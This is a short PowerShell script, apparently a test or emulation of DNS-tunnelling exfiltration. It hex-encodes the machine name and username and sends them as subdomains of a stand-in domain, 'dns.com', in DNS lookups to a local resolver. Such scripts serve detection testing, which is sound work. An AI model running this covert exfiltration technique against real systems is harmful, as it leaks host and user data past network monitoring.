$samplefile = (New-TemporaryFile).FullName
$fakeServer = "dns.com"
$DnsServer = "127.0.0.1"

$env:computername+" "+$env:USERNAME | Out-File $samplefile -NoNewline
$Data = ([io.file]::ReadAllText($samplefile)) -split ' '
ForEach ($D in $Data){
    $Address = (([System.BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($D))).Replace('-','')+"."+$fakeServer)
    Write-Host $Address
    Resolve-DnsName -Server $DnsServer -Name $Address -Type A -ErrorAction Ignore
    Start-Sleep -Seconds 1 
}
Remove-Item $samplefile
